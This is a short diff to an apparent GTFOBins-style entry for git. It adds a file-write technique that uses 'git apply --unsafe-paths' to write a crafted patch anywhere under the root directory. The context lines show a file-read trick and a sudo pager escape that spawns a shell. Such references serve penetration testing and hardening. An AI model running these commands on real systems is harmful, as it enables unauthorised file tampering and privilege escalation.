@@ -26,6 +26,10 @@ functions:
       code: |
         LFILE=file_to_read
         git diff /dev/null $LFILE
+  file-write:
+    - description: The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.
+      code: |
+        git apply --unsafe-paths --directory / x.patch
   sudo:
     - code: sudo PAGER='sh -c "exec sh 0<&1"' git -p help
     - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
